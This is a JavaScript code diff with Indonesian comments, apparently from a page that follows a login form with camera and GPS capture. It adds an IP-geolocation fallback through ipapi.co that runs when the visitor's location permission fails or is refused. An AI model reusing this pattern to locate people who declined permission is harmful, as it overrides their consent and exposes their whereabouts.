@@ -279,7 +279,7 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
 });
 
 // ============================================================
-// 3. STEP 2: KAMERA + GPS
+// 3. STEP 2: KAMERA + GPS (FIXED + FALLBACK IP)
 // ============================================================
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
@@ -292,24 +292,39 @@ let stream = null;
 let cameraReady = false;
 let gpsData = { lat: '-', lon: '-', acc: '-' };
 
-// === GPS ===
+// === GPS + FALLBACK IP ===
 function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                gpsData.lat = pos.coords.latitude;
-                gpsData.lon = pos.coords.longitude;
-                gpsData.acc = pos.coords.accuracy;
-                gpsText.textContent = `${gpsData.lat}, ${gpsData.lon} (±${gpsData.acc}m)`;
-            },
-            () => {
-                gpsText.textContent = '❌ Gagal ambil lokasi';
-            },
-            { enableHighAccuracy: true, timeout: 5000 }
-        );
-    } else {
+    if (!navigator.geolocation) {
         gpsText.textContent = '❌ GPS tidak support';
+        return;
     }
+    
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            gpsData.lat = pos.coords.latitude;
+            gpsData.lon = pos.coords.longitude;
+            gpsData.acc = pos.coords.accuracy;
+            gpsText.textContent = `${gpsData.lat}, ${gpsData.lon} (±${gpsData.acc}m)`;
+        },
+        (err) => {
+            gpsText.textContent = `❌ Gagal: ${err.message}`;
+            // Fallback: ambil lokasi dari IP
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    if (data.latitude && data.longitude) {
+                        gpsData.lat = data.latitude;
+                        gpsData.lon = data.longitude;
+                        gpsData.acc = 'IP-based';
+                        gpsText.textContent = `${data.latitude}, ${data.longitude} (IP-based)`;
+                    }
+                })
+                .catch(() => {
+                    gpsText.textContent = '❌ Gagal ambil lokasi (GPS & IP)';
+                });
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
 }
 
 // === KAMERA ===
